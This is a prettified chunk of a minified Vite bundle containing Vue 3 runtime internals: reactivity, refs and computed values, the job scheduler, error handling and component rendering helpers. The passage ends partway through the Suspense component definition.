const imagePath = "images/ttbt.png";

function __vite__mapDeps(indexes) {
  return (
    __vite__mapDeps.viteFileDeps ||
      (__vite__mapDeps.viteFileDeps = [
        "./DK0Z3iS4.js",
        "./R0oAJHeV.js",
        "./Bhgf-dOP.js",
      ]),
    indexes.map((i) => __vite__mapDeps.viteFileDeps[i])
  );
}
function Pa(e, t) {
  const n = new Set(e.split(","));
  return t ? (o) => n.has(o.toLowerCase()) : (o) => n.has(o);
}
const Je = {},
  bo = [],
  Et = () => {},
  kp = () => !1,
  pi = (e) =>
    111 === e.charCodeAt(0) &&
    110 === e.charCodeAt(1) &&
    (e.charCodeAt(2) > 122 || e.charCodeAt(2) < 97),
  Ma = (e) => e.startsWith("onUpdate:"),
  rt = Object.assign,
  Sa = (e, t) => {
    const n = e.indexOf(t);
    n > -1 && e.splice(n, 1);
  },
  Ep = Object.prototype.hasOwnProperty,
  We = (e, t) => Ep.call(e, t),
  ye = Array.isArray,
  _o = (e) => "[object Map]" === Mr(e),
  hu = (e) => "[object Set]" === Mr(e),
  Ae = (e) => "function" == typeof e,
  Ze = (e) => "string" == typeof e,
  Co = (e) => "symbol" == typeof e,
  ze = (e) => null !== e && "object" == typeof e,
  pu = (e) => (ze(e) || Ae(e)) && Ae(e.then) && Ae(e.catch),
  gu = Object.prototype.toString,
  Mr = (e) => gu.call(e),
  Dp = (e) => Mr(e).slice(8, -1),
  mu = (e) => "[object Object]" === Mr(e),
  Ta = (e) =>
    Ze(e) && "NaN" !== e && "-" !== e[0] && "" + parseInt(e, 10) === e,
  xo = Pa(
    ",key,ref,ref_for,ref_key,onVnodeBeforeMount,onVnodeMounted,onVnodeBeforeUpdate,onVnodeUpdated,onVnodeBeforeUnmount,onVnodeUnmounted"
  ),
  Sr = (e) => {
    const t = Object.create(null);
    return (n) => t[n] || (t[n] = e(n));
  },
  Ip = /-(\w)/g,
  Qt = Sr((e) => e.replace(Ip, (t, n) => (n ? n.toUpperCase() : ""))),
  Op = /\B([A-Z])/g,
  Wo = Sr((e) => e.replace(Op, "-$1").toLowerCase()),
  Tr = Sr((e) => e.charAt(0).toUpperCase() + e.slice(1)),
  Ms = Sr((e) => (e ? `on${Tr(e)}` : "")),
  Nn = (e, t) => !Object.is(e, t),
  Qi = (e, t) => {
    for (let n = 0; n < e.length; n++) e[n](t);
  },
  rr = (e, t, n) => {
    Object.defineProperty(e, t, { configurable: !0, enumerable: !1, value: n });
  },
  Ys = (e) => {
    const t = parseFloat(e);
    return isNaN(t) ? e : t;
  },
  Rp = (e) => {
    const t = Ze(e) ? Number(e) : NaN;
    return isNaN(t) ? e : t;
  };
let ic;
const vu = () =>
  ic ||
  (ic =
    typeof globalThis < "u"
      ? globalThis
      : typeof self < "u"
      ? self
      : typeof window < "u"
      ? window
      : typeof global < "u"
      ? global
      : {});
function Pt(e) {
  if (ye(e)) {
    const t = {};
    for (let n = 0; n < e.length; n++) {
      const o = e[n],
        i = Ze(o) ? Fp(o) : Pt(o);
      if (i) for (const a in i) t[a] = i[a];
    }
    return t;
  }
  if (Ze(e) || ze(e)) return e;
}
const Cp = /;(?![^(]*\))/g,
  Wp = /:([^]+)/,
  Gp = /\/\*[^]*?\*\//g;
function Fp(e) {
  const t = {};
  return (
    e
      .replace(Gp, "")
      .split(Cp)
      .forEach((n) => {
        if (n) {
          const o = n.split(Wp);
          o.length > 1 && (t[o[0].trim()] = o[1].trim());
        }
      }),
    t
  );
}
function gt(e) {
  let t = "";
  if (Ze(e)) t = e;
  else if (ye(e))
    for (let n = 0; n < e.length; n++) {
      const o = gt(e[n]);
      o && (t += o + " ");
    }
  else if (ze(e)) for (const n in e) e[n] && (t += n + " ");
  return t.trim();
}
function Lp(e) {
  if (!e) return null;
  let { class: t, style: n } = e;
  return t && !Ze(t) && (e.class = gt(t)), n && (e.style = Pt(n)), e;
}
const jp =
    "itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly",
  Np = Pa(jp);
function yu(e) {
  return !!e || "" === e;
}
const xt = (e) =>
    Ze(e)
      ? e
      : null == e
      ? ""
      : ye(e) || (ze(e) && (e.toString === gu || !Ae(e.toString)))
      ? JSON.stringify(e, wu, 2)
      : String(e),
  wu = (e, t) =>
    t && t.__v_isRef
      ? wu(e, t.value)
      : _o(t)
      ? {
          [`Map(${t.size})`]: [...t.entries()].reduce(
            (n, [o, i], a) => ((n[Ss(o, a) + " =>"] = i), n),
            {}
          ),
        }
      : hu(t)
      ? { [`Set(${t.size})`]: [...t.values()].map((n) => Ss(n)) }
      : Co(t)
      ? Ss(t)
      : !ze(t) || ye(t) || mu(t)
      ? t
      : String(t),
  Ss = (e, t = "") => {
    var n;
    return Co(e) ? `Symbol(${null != (n = e.description) ? n : t})` : e;
  };
let _t, to;
class Au {
  constructor(t = !1) {
    (this.detached = t),
      (this._active = !0),
      (this.effects = []),
      (this.cleanups = []),
      (this.parent = _t),
      !t && _t && (this.index = (_t.scopes || (_t.scopes = [])).push(this) - 1);
  }
  get active() {
    return this._active;
  }
  run(t) {
    if (this._active) {
      const n = _t;
      try {
        return (_t = this), t();
      } finally {
        _t = n;
      }
    }
  }
  on() {
    _t = this;
  }
  off() {
    _t = this.parent;
  }
  stop(t) {
    if (this._active) {
      let n, o;
      for (n = 0, o = this.effects.length; n < o; n++) this.effects[n].stop();
      for (n = 0, o = this.cleanups.length; n < o; n++) this.cleanups[n]();
      if (this.scopes)
        for (n = 0, o = this.scopes.length; n < o; n++) this.scopes[n].stop(!0);
      if (!this.detached && this.parent && !t) {
        const i = this.parent.scopes.pop();
        i &&
          i !== this &&
          ((this.parent.scopes[this.index] = i), (i.index = this.index));
      }
      (this.parent = void 0), (this._active = !1);
    }
  }
}
function ka(e) {
  return new Au(e);
}
function Bp(e, t = _t) {
  t && t.active && t.effects.push(e);
}
function bu() {
  return _t;
}
function Jp(e) {
  _t && _t.cleanups.push(e);
}
class Ea {
  constructor(t, n, o, i) {
    (this.fn = t),
      (this.trigger = n),
      (this.scheduler = o),
      (this.active = !0),
      (this.deps = []),
      (this._dirtyLevel = 4),
      (this._trackId = 0),
      (this._runnings = 0),
      (this._shouldSchedule = !1),
      (this._depsLength = 0),
      Bp(this, i);
  }
  get dirty() {
    if (2 === this._dirtyLevel || 3 === this._dirtyLevel) {
      (this._dirtyLevel = 1), ao();
      for (let t = 0; t < this._depsLength; t++) {
        const n = this.deps[t];
        if (n.computed && (zp(n.computed), this._dirtyLevel >= 4)) break;
      }
      1 === this._dirtyLevel && (this._dirtyLevel = 0), lo();
    }
    return this._dirtyLevel >= 4;
  }
  set dirty(t) {
    this._dirtyLevel = t ? 4 : 0;
  }
  run() {
    if (((this._dirtyLevel = 0), !this.active)) return this.fn();
    let t = Gn,
      n = to;
    try {
      return (Gn = !0), (to = this), this._runnings++, rc(this), this.fn();
    } finally {
      sc(this), this._runnings--, (to = n), (Gn = t);
    }
  }
  stop() {
    var t;
    this.active &&
      (rc(this),
      sc(this),
      null == (t = this.onStop) || t.call(this),
      (this.active = !1));
  }
}
function zp(e) {
  return e.value;
}
function rc(e) {
  e._trackId++, (e._depsLength = 0);
}
function sc(e) {
  if (e.deps.length > e._depsLength) {
    for (let t = e._depsLength; t < e.deps.length; t++) _u(e.deps[t], e);
    e.deps.length = e._depsLength;
  }
}
function _u(e, t) {
  const n = e.get(t);
  void 0 !== n &&
    t._trackId !== n &&
    (e.delete(t), 0 === e.size && e.cleanup());
}
let Gn = !0,
  Us = 0;
const xu = [];
function ao() {
  xu.push(Gn), (Gn = !1);
}
function lo() {
  const e = xu.pop();
  Gn = void 0 === e || e;
}
function Da() {
  Us++;
}
function Ia() {
  for (Us--; !Us && Hs.length; ) Hs.shift()();
}
function Pu(e, t, n) {
  if (t.get(e) !== e._trackId) {
    t.set(e, e._trackId);
    const o = e.deps[e._depsLength];
    o !== t ? (o && _u(o, e), (e.deps[e._depsLength++] = t)) : e._depsLength++;
  }
}
const Hs = [];
function Mu(e, t, n) {
  Da();
  for (const o of e.keys()) {
    let i;
    o._dirtyLevel < t &&
      (i ?? (i = e.get(o) === o._trackId)) &&
      (o._shouldSchedule || (o._shouldSchedule = 0 === o._dirtyLevel),
      (o._dirtyLevel = t)),
      o._shouldSchedule &&
        (i ?? (i = e.get(o) === o._trackId)) &&
        (o.trigger(),
        (!o._runnings || o.allowRecurse) &&
          2 !== o._dirtyLevel &&
          ((o._shouldSchedule = !1), o.scheduler && Hs.push(o.scheduler)));
  }
  Ia();
}
const Su = (e, t) => {
    const n = new Map();
    return (n.cleanup = e), (n.computed = t), n;
  },
  sr = new WeakMap(),
  no = Symbol(""),
  Vs = Symbol("");
function mt(e, t, n) {
  if (Gn && to) {
    let o = sr.get(e);
    o || sr.set(e, (o = new Map()));
    let i = o.get(n);
    i || o.set(n, (i = Su(() => o.delete(n)))), Pu(to, i);
  }
}
function cn(e, t, n, o, i, a) {
  const u = sr.get(e);
  if (!u) return;
  let f = [];
  if ("clear" === t) f = [...u.values()];
  else if ("length" === n && ye(e)) {
    const p = Number(o);
    u.forEach((v, y) => {
      ("length" === y || (!Co(y) && y >= p)) && f.push(v);
    });
  } else
    switch ((void 0 !== n && f.push(u.get(n)), t)) {
      case "add":
        ye(e)
          ? Ta(n) && f.push(u.get("length"))
          : (f.push(u.get(no)), _o(e) && f.push(u.get(Vs)));
        break;
      case "delete":
        ye(e) || (f.push(u.get(no)), _o(e) && f.push(u.get(Vs)));
        break;
      case "set":
        _o(e) && f.push(u.get(no));
    }
  Da();
  for (const p of f) p && Mu(p, 4);
  Ia();
}
function Yp(e, t) {
  var n;
  return null == (n = sr.get(e)) ? void 0 : n.get(t);
}
const Up = Pa("__proto__,__v_isRef,__isVue"),
  Tu = new Set(
    Object.getOwnPropertyNames(Symbol)
      .filter((e) => "arguments" !== e && "caller" !== e)
      .map((e) => Symbol[e])
      .filter(Co)
  ),
  ac = Hp();
function Hp() {
  const e = {};
  return (
    ["includes", "indexOf", "lastIndexOf"].forEach((t) => {
      e[t] = function (...n) {
        const o = Ge(this);
        for (let a = 0, u = this.length; a < u; a++) mt(o, "get", a + "");
        const i = o[t](...n);
        return -1 === i || !1 === i ? o[t](...n.map(Ge)) : i;
      };
    }),
    ["push", "pop", "shift", "unshift", "splice"].forEach((t) => {
      e[t] = function (...n) {
        ao(), Da();
        const o = Ge(this)[t].apply(this, n);
        return Ia(), lo(), o;
      };
    }),
    e
  );
}
function Vp(e) {
  const t = Ge(this);
  return mt(t, "has", e), t.hasOwnProperty(e);
}
class ku {
  constructor(t = !1, n = !1) {
    (this._isReadonly = t), (this._isShallow = n);
  }
  get(t, n, o) {
    const i = this._isReadonly,
      a = this._isShallow;
    if ("__v_isReactive" === n) return !i;
    if ("__v_isReadonly" === n) return i;
    if ("__v_isShallow" === n) return a;
    if ("__v_raw" === n)
      return o === (i ? (a ? sg : Ou) : a ? Iu : Du).get(t) ||
        Object.getPrototypeOf(t) === Object.getPrototypeOf(o)
        ? t
        : void 0;
    const u = ye(t);
    if (!i) {
      if (u && We(ac, n)) return Reflect.get(ac, n, o);
      if ("hasOwnProperty" === n) return Vp;
    }
    const f = Reflect.get(t, n, o);
    return (Co(n) ? Tu.has(n) : Up(n)) || (i || mt(t, "get", n), a)
      ? f
      : $e(f)
      ? u && Ta(n)
        ? f
        : f.value
      : ze(f)
      ? i
        ? Cu(f)
        : fn(f)
      : f;
  }
}
class Eu extends ku {
  constructor(t = !1) {
    super(!1, t);
  }
  set(t, n, o, i) {
    let a = t[n];
    if (!this._isShallow) {
      const p = ro(a);
      if (
        (!ar(o) && !ro(o) && ((a = Ge(a)), (o = Ge(o))),
        !ye(t) && $e(a) && !$e(o))
      )
        return !p && ((a.value = o), !0);
    }
    const u = ye(t) && Ta(n) ? Number(n) < t.length : We(t, n),
      f = Reflect.set(t, n, o, i);
    return (
      t === Ge(i) && (u ? Nn(o, a) && cn(t, "set", n, o) : cn(t, "add", n, o)),
      f
    );
  }
  deleteProperty(t, n) {
    const o = We(t, n);
    t[n];
    const i = Reflect.deleteProperty(t, n);
    return i && o && cn(t, "delete", n, void 0), i;
  }
  has(t, n) {
    const o = Reflect.has(t, n);
    return (!Co(n) || !Tu.has(n)) && mt(t, "has", n), o;
  }
  ownKeys(t) {
    return mt(t, "iterate", ye(t) ? "length" : no), Reflect.ownKeys(t);
  }
}
class Qp extends ku {
  constructor(t = !1) {
    super(!0, t);
  }
  set(t, n) {
    return !0;
  }
  deleteProperty(t, n) {
    return !0;
  }
}
const Xp = new Eu(),
  Zp = new Qp(),
  qp = new Eu(!0),
  Oa = (e) => e,
  kr = (e) => Reflect.getPrototypeOf(e);
function Gi(e, t, n = !1, o = !1) {
  const i = Ge((e = e.__v_raw)),
    a = Ge(t);
  n || (Nn(t, a) && mt(i, "get", t), mt(i, "get", a));
  const { has: u } = kr(i),
    f = o ? Oa : n ? Wa : ri;
  return u.call(i, t)
    ? f(e.get(t))
    : u.call(i, a)
    ? f(e.get(a))
    : void (e !== i && e.get(t));
}
function Fi(e, t = !1) {
  const n = this.__v_raw,
    o = Ge(n),
    i = Ge(e);
  return (
    t || (Nn(e, i) && mt(o, "has", e), mt(o, "has", i)),
    e === i ? n.has(e) : n.has(e) || n.has(i)
  );
}
function Li(e, t = !1) {
  return (
    (e = e.__v_raw), !t && mt(Ge(e), "iterate", no), Reflect.get(e, "size", e)
  );
}
function lc(e) {
  e = Ge(e);
  const t = Ge(this);
  return kr(t).has.call(t, e) || (t.add(e), cn(t, "add", e, e)), this;
}
function cc(e, t) {
  t = Ge(t);
  const n = Ge(this),
    { has: o, get: i } = kr(n);
  let a = o.call(n, e);
  a || ((e = Ge(e)), (a = o.call(n, e)));
  const u = i.call(n, e);
  return (
    n.set(e, t), a ? Nn(t, u) && cn(n, "set", e, t) : cn(n, "add", e, t), this
  );
}
function uc(e) {
  const t = Ge(this),
    { has: n, get: o } = kr(t);
  let i = n.call(t, e);
  i || ((e = Ge(e)), (i = n.call(t, e))), o && o.call(t, e);
  const a = t.delete(e);
  return i && cn(t, "delete", e, void 0), a;
}
function dc() {
  const e = Ge(this),
    t = 0 !== e.size,
    n = e.clear();
  return t && cn(e, "clear", void 0, void 0), n;
}
function ji(e, t) {
  return function (o, i) {
    const a = this,
      u = a.__v_raw,
      f = Ge(u),
      p = t ? Oa : e ? Wa : ri;
    return (
      !e && mt(f, "iterate", no), u.forEach((v, y) => o.call(i, p(v), p(y), a))
    );
  };
}
function Ni(e, t, n) {
  return function (...o) {
    const i = this.__v_raw,
      a = Ge(i),
      u = _o(a),
      f = "entries" === e || (e === Symbol.iterator && u),
      p = "keys" === e && u,
      v = i[e](...o),
      y = n ? Oa : t ? Wa : ri;
    return (
      !t && mt(a, "iterate", p ? Vs : no),
      {
        next() {
          const { value: w, done: x } = v.next();
          return x
            ? { value: w, done: x }
            : { value: f ? [y(w[0]), y(w[1])] : y(w), done: x };
        },
        [Symbol.iterator]() {
          return this;
        },
      }
    );
  };
}
function Sn(e) {
  return function (...t) {
    return "delete" !== e && ("clear" === e ? void 0 : this);
  };
}
function Kp() {
  const e = {
      get(a) {
        return Gi(this, a);
      },
      get size() {
        return Li(this);
      },
      has: Fi,
      add: lc,
      set: cc,
      delete: uc,
      clear: dc,
      forEach: ji(!1, !1),
    },
    t = {
      get(a) {
        return Gi(this, a, !1, !0);
      },
      get size() {
        return Li(this);
      },
      has: Fi,
      add: lc,
      set: cc,
      delete: uc,
      clear: dc,
      forEach: ji(!1, !0),
    },
    n = {
      get(a) {
        return Gi(this, a, !0);
      },
      get size() {
        return Li(this, !0);
      },
      has(a) {
        return Fi.call(this, a, !0);
      },
      add: Sn("add"),
      set: Sn("set"),
      delete: Sn("delete"),
      clear: Sn("clear"),
      forEach: ji(!0, !1),
    },
    o = {
      get(a) {
        return Gi(this, a, !0, !0);
      },
      get size() {
        return Li(this, !0);
      },
      has(a) {
        return Fi.call(this, a, !0);
      },
      add: Sn("add"),
      set: Sn("set"),
      delete: Sn("delete"),
      clear: Sn("clear"),
      forEach: ji(!0, !0),
    };
  return (
    ["keys", "values", "entries", Symbol.iterator].forEach((a) => {
      (e[a] = Ni(a, !1, !1)),
        (n[a] = Ni(a, !0, !1)),
        (t[a] = Ni(a, !1, !0)),
        (o[a] = Ni(a, !0, !0));
    }),
    [e, n, t, o]
  );
}
const [$p, eg, tg, ng] = Kp();
function Ra(e, t) {
  const n = t ? (e ? ng : tg) : e ? eg : $p;
  return (o, i, a) =>
    "__v_isReactive" === i
      ? !e
      : "__v_isReadonly" === i
      ? e
      : "__v_raw" === i
      ? o
      : Reflect.get(We(n, i) && i in o ? n : o, i, a);
}
const og = { get: Ra(!1, !1) },
  ig = { get: Ra(!1, !0) },
  rg = { get: Ra(!0, !1) },
  Du = new WeakMap(),
  Iu = new WeakMap(),
  Ou = new WeakMap(),
  sg = new WeakMap();
function ag(e) {
  switch (e) {
    case "Object":
    case "Array":
      return 1;
    case "Map":
    case "Set":
    case "WeakMap":
    case "WeakSet":
      return 2;
    default:
      return 0;
  }
}
function lg(e) {
  return e.__v_skip || !Object.isExtensible(e) ? 0 : ag(Dp(e));
}
function fn(e) {
  return ro(e) ? e : Ca(e, !1, Xp, og, Du);
}
function Ru(e) {
  return Ca(e, !1, qp, ig, Iu);
}
function Cu(e) {
  return Ca(e, !0, Zp, rg, Ou);
}
function Ca(e, t, n, o, i) {
  if (!ze(e) || (e.__v_raw && (!t || !e.__v_isReactive))) return e;
  const a = i.get(e);
  if (a) return a;
  const u = lg(e);
  if (0 === u) return e;
  const f = new Proxy(e, 2 === u ? o : n);
  return i.set(e, f), f;
}
function Fn(e) {
  return ro(e) ? Fn(e.__v_raw) : !(!e || !e.__v_isReactive);
}
function ro(e) {
  return !(!e || !e.__v_isReadonly);
}
function ar(e) {
  return !(!e || !e.__v_isShallow);
}
function Wu(e) {
  return Fn(e) || ro(e);
}
function Ge(e) {
  const t = e && e.__v_raw;
  return t ? Ge(t) : e;
}
function Er(e) {
  return Object.isExtensible(e) && rr(e, "__v_skip", !0), e;
}
const ri = (e) => (ze(e) ? fn(e) : e),
  Wa = (e) => (ze(e) ? Cu(e) : e);
class Gu {
  constructor(t, n, o, i) {
    (this.getter = t),
      (this._setter = n),
      (this.dep = void 0),
      (this.__v_isRef = !0),
      (this.__v_isReadonly = !1),
      (this.effect = new Ea(
        () => t(this._value),
        () => Xi(this, 2 === this.effect._dirtyLevel ? 2 : 3)
      )),
      (this.effect.computed = this),
      (this.effect.active = this._cacheable = !i),
      (this.__v_isReadonly = o);
  }
  get value() {
    const t = Ge(this);
    return (
      (!t._cacheable || t.effect.dirty) &&
        Nn(t._value, (t._value = t.effect.run())) &&
        Xi(t, 4),
      Fu(t),
      t.effect._dirtyLevel >= 2 && Xi(t, 2),
      t._value
    );
  }
  set value(t) {
    this._setter(t);
  }
  get _dirty() {
    return this.effect.dirty;
  }
  set _dirty(t) {
    this.effect.dirty = t;
  }
}
function cg(e, t, n = !1) {
  let o, i;
  const a = Ae(e);
  return (
    a ? ((o = e), (i = Et)) : ((o = e.get), (i = e.set)),
    new Gu(o, i, a || !i, n)
  );
}
function Fu(e) {
  var t;
  Gn &&
    to &&
    ((e = Ge(e)),
    Pu(
      to,
      null != (t = e.dep)
        ? t
        : (e.dep = Su(() => (e.dep = void 0), e instanceof Gu ? e : void 0))
    ));
}
function Xi(e, t = 4, n) {
  const o = (e = Ge(e)).dep;
  o && Mu(o, t);
}
function $e(e) {
  return !(!e || !0 !== e.__v_isRef);
}
function Me(e) {
  return Lu(e, !1);
}
function fc(e) {
  return Lu(e, !0);
}
function Lu(e, t) {
  return $e(e) ? e : new ug(e, t);
}
class ug {
  constructor(t, n) {
    (this.__v_isShallow = n),
      (this.dep = void 0),
      (this.__v_isRef = !0),
      (this._rawValue = n ? t : Ge(t)),
      (this._value = n ? t : ri(t));
  }
  get value() {
    return Fu(this), this._value;
  }
  set value(t) {
    const n = this.__v_isShallow || ar(t) || ro(t);
    (t = n ? t : Ge(t)),
      Nn(t, this._rawValue) &&
        ((this._rawValue = t), (this._value = n ? t : ri(t)), Xi(this, 4));
  }
}
function De(e) {
  return $e(e) ? e.value : e;
}
const dg = {
  get: (e, t, n) => De(Reflect.get(e, t, n)),
  set: (e, t, n, o) => {
    const i = e[t];
    return $e(i) && !$e(n) ? ((i.value = n), !0) : Reflect.set(e, t, n, o);
  },
};
function ju(e) {
  return Fn(e) ? e : new Proxy(e, dg);
}
function fg(e) {
  const t = ye(e) ? new Array(e.length) : {};
  for (const n in e) t[n] = Nu(e, n);
  return t;
}
class hg {
  constructor(t, n, o) {
    (this._object = t),
      (this._key = n),
      (this._defaultValue = o),
      (this.__v_isRef = !0);
  }
  get value() {
    const t = this._object[this._key];
    return void 0 === t ? this._defaultValue : t;
  }
  set value(t) {
    this._object[this._key] = t;
  }
  get dep() {
    return Yp(Ge(this._object), this._key);
  }
}
class pg {
  constructor(t) {
    (this._getter = t), (this.__v_isRef = !0), (this.__v_isReadonly = !0);
  }
  get value() {
    return this._getter();
  }
}
function gg(e, t, n) {
  return $e(e)
    ? e
    : Ae(e)
    ? new pg(e)
    : ze(e) && arguments.length > 1
    ? Nu(e, t, n)
    : Me(e);
}
function Nu(e, t, n) {
  const o = e[t];
  return $e(o) ? o : new hg(e, t, n);
}
function Ln(e, t, n, o) {
  try {
    return o ? e(...o) : e();
  } catch (i) {
    Go(i, t, n);
  }
}
function jt(e, t, n, o) {
  if (Ae(e)) {
    const a = Ln(e, t, n, o);
    return (
      a &&
        pu(a) &&
        a.catch((u) => {
          Go(u, t, n);
        }),
      a
    );
  }
  const i = [];
  for (let a = 0; a < e.length; a++) i.push(jt(e[a], t, n, o));
  return i;
}
function Go(e, t, n, o = !0) {
  const i = t ? t.vnode : null;
  if (t) {
    let a = t.parent;
    const u = t.proxy,
      f = `https://vuejs.org/error-reference/#runtime-${n}`;
    for (; a; ) {
      const v = a.ec;
      if (v)
        for (let y = 0; y < v.length; y++) if (!1 === v[y](e, u, f)) return;
      a = a.parent;
    }
    const p = t.appContext.config.errorHandler;
    if (p) return void Ln(p, null, 10, [e, u, f]);
  }
  mg(e, n, i, o);
}
function mg(e, t, n, o = !0) {
  console.error(e);
}
let si = !1,
  Qs = !1;
const at = [];
let Ht = 0;
const Po = [];
let Dn = null,
  Kn = 0;
const Bu = Promise.resolve();
let Ga = null;
function Dr(e) {
  const t = Ga || Bu;
  return e ? t.then(this ? e.bind(this) : e) : t;
}
function vg(e) {
  let t = Ht + 1,
    n = at.length;
  for (; t < n; ) {
    const o = (t + n) >>> 1,
      i = at[o],
      a = ai(i);
    a < e || (a === e && i.pre) ? (t = o + 1) : (n = o);
  }
  return t;
}
function Ir(e) {
  (!at.length || !at.includes(e, si && e.allowRecurse ? Ht + 1 : Ht)) &&
    (null == e.id ? at.push(e) : at.splice(vg(e.id), 0, e), Ju());
}
function Ju() {
  !si && !Qs && ((Qs = !0), (Ga = Bu.then(zu)));
}
function yg(e) {
  const t = at.indexOf(e);
  t > Ht && at.splice(t, 1);
}
function Xs(e) {
  ye(e)
    ? Po.push(...e)
    : (!Dn || !Dn.includes(e, e.allowRecurse ? Kn + 1 : Kn)) && Po.push(e),
    Ju();
}
function hc(e, t, n = si ? Ht + 1 : 0) {
  for (; n < at.length; n++) {
    const o = at[n];
    if (o && o.pre) {
      if (e && o.id !== e.uid) continue;
      at.splice(n, 1), n--, o();
    }
  }
}
function lr(e) {
  if (Po.length) {
    const t = [...new Set(Po)].sort((n, o) => ai(n) - ai(o));
    if (((Po.length = 0), Dn)) return void Dn.push(...t);
    for (Dn = t, Kn = 0; Kn < Dn.length; Kn++) Dn[Kn]();
    (Dn = null), (Kn = 0);
  }
}
const ai = (e) => (null == e.id ? 1 / 0 : e.id),
  wg = (e, t) => {
    const n = ai(e) - ai(t);
    if (0 === n) {
      if (e.pre && !t.pre) return -1;
      if (t.pre && !e.pre) return 1;
    }
    return n;
  };
function zu(e) {
  (Qs = !1), (si = !0), at.sort(wg);
  try {
    for (Ht = 0; Ht < at.length; Ht++) {
      const t = at[Ht];
      t && !1 !== t.active && Ln(t, null, 14);
    }
  } finally {
    (Ht = 0),
      (at.length = 0),
      lr(),
      (si = !1),
      (Ga = null),
      (at.length || Po.length) && zu();
  }
}
function Ag(e, t, ...n) {
  if (e.isUnmounted) return;
  const o = e.vnode.props || Je;
  let i = n;
  const a = t.startsWith("update:"),
    u = a && t.slice(7);
  if (u && u in o) {
    const y = `${"modelValue" === u ? "model" : u}Modifiers`,
      { number: w, trim: x } = o[y] || Je;
    x && (i = n.map((k) => (Ze(k) ? k.trim() : k))), w && (i = n.map(Ys));
  }
  let f,
    p = o[(f = Ms(t))] || o[(f = Ms(Qt(t)))];
  !p && a && (p = o[(f = Ms(Wo(t)))]), p && jt(p, e, 6, i);
  const v = o[f + "Once"];
  if (v) {
    if (e.emitted) {
      if (e.emitted[f]) return;
    } else e.emitted = {};
    (e.emitted[f] = !0), jt(v, e, 6, i);
  }
}
function Yu(e, t, n = !1) {
  const o = t.emitsCache,
    i = o.get(e);
  if (void 0 !== i) return i;
  const a = e.emits;
  let u = {},
    f = !1;
  if (!Ae(e)) {
    const p = (v) => {
      const y = Yu(v, t, !0);
      y && ((f = !0), rt(u, y));
    };
    !n && t.mixins.length && t.mixins.forEach(p),
      e.extends && p(e.extends),
      e.mixins && e.mixins.forEach(p);
  }
  return a || f
    ? (ye(a) ? a.forEach((p) => (u[p] = null)) : rt(u, a),
      ze(e) && o.set(e, u),
      u)
    : (ze(e) && o.set(e, null), null);
}
function Or(e, t) {
  return (
    !(!e || !pi(t)) &&
    ((t = t.slice(2).replace(/Once$/, "")),
    We(e, t[0].toLowerCase() + t.slice(1)) || We(e, Wo(t)) || We(e, t))
  );
}
let Ke = null,
  Rr = null;
function cr(e) {
  const t = Ke;
  return (Ke = e), (Rr = (e && e.type.__scopeId) || null), t;
}
function Bn(e) {
  Rr = e;
}
function Jn() {
  Rr = null;
}
function Fa(e, t = Ke, n) {
  if (!t || e._n) return e;
  const o = (...i) => {
    o._d && Sc(-1);
    const a = cr(t);
    let u;
    try {
      u = e(...i);
    } finally {
      cr(a), o._d && Sc(1);
    }
    return u;
  };
  return (o._n = !0), (o._c = !0), (o._d = !0), o;
}
function Ts(e) {
  const {
    type: t,
    vnode: n,
    proxy: o,
    withProxy: i,
    props: a,
    propsOptions: [u],
    slots: f,
    attrs: p,
    emit: v,
    render: y,
    renderCache: w,
    data: x,
    setupState: k,
    ctx: D,
    inheritAttrs: G,
  } = e;
  let q, ie;
  const te = cr(e);
  try {
    if (4 & n.shapeFlag) {
      const C = i || o,
        I = C;
      (q = Tt(y.call(I, C, w, a, k, x, D))), (ie = p);
    } else {
      const C = t;
      (q = Tt(
        C.length > 1 ? C(a, { attrs: p, slots: f, emit: v }) : C(a, null)
      )),
        (ie = t.props ? p : _g(p));
    }
  } catch (C) {
    (ti.length = 0), Go(C, e, 1), (q = Qe(Nt));
  }
  let E = q;
  if (ie && !1 !== G) {
    const C = Object.keys(ie),
      { shapeFlag: I } = E;
    C.length && 7 & I && (u && C.some(Ma) && (ie = xg(ie, u)), (E = Ro(E, ie)));
  }
  return (
    n.dirs && ((E = Ro(E)), (E.dirs = E.dirs ? E.dirs.concat(n.dirs) : n.dirs)),
    n.transition && (E.transition = n.transition),
    (q = E),
    cr(te),
    q
  );
}
function bg(e, t = !0) {
  let n;
  for (let o = 0; o < e.length; o++) {
    const i = e[o];
    if (!ci(i)) return;
    if (i.type !== Nt || "v-if" === i.children) {
      if (n) return;
      n = i;
    }
  }
  return n;
}
const _g = (e) => {
    let t;
    for (const n in e)
      ("class" === n || "style" === n || pi(n)) && ((t || (t = {}))[n] = e[n]);
    return t;
  },
  xg = (e, t) => {
    const n = {};
    for (const o in e) (!Ma(o) || !(o.slice(9) in t)) && (n[o] = e[o]);
    return n;
  };
function Pg(e, t, n) {
  const { props: o, children: i, component: a } = e,
    { props: u, children: f, patchFlag: p } = t,
    v = a.emitsOptions;
  if (t.dirs || t.transition) return !0;
  if (!(n && p >= 0))
    return (
      !((!i && !f) || (f && f.$stable)) ||
      (o !== u && (o ? !u || pc(o, u, v) : !!u))
    );
  if (1024 & p) return !0;
  if (16 & p) return o ? pc(o, u, v) : !!u;
  if (8 & p) {
    const y = t.dynamicProps;
    for (let w = 0; w < y.length; w++) {
      const x = y[w];
      if (u[x] !== o[x] && !Or(v, x)) return !0;
    }
  }
  return !1;
}
function pc(e, t, n) {
  const o = Object.keys(t);
  if (o.length !== Object.keys(e).length) return !0;
  for (let i = 0; i < o.length; i++) {
    const a = o[i];
    if (t[a] !== e[a] && !Or(n, a)) return !0;
  }
  return !1;
}
function La({ vnode: e, parent: t }, n) {
  for (; t; ) {
    const o = t.subTree;
    if ((o.suspense && o.suspense.activeBranch === e && (o.el = e.el), o !== e))
      break;
    ((e = t.vnode).el = n), (t = t.parent);
  }
}
const ja = "components";
function HM(e, t) {
  return Hu(ja, e, !0, t) || e;
}
const Uu = Symbol.for("v-ndc");
function Zs(e) {
  return Ze(e) ? Hu(ja, e, !1) || e : e || Uu;
}
function Hu(e, t, n = !0, o = !1) {
  const i = Ke || tt;
  if (i) {
    const a = i.type;
    if (e === ja) {
      const f = _m(a, !1);
      if (f && (f === t || f === Qt(t) || f === Tr(Qt(t)))) return a;
    }
    const u = gc(i[e] || a[e], t) || gc(i.appContext[e], t);
    return !u && o ? a : u;
  }
}
function gc(e, t) {
  return e && (e[t] || e[Qt(t)] || e[Tr(Qt(t))]);
}
const Mg = (e) => e.__isSuspense;
let qs = 0;
const Sg = {
    name: "Suspense",
    __isSuspense: !0,
    process(e, t, n, o, i, a, u, f, p, v) {
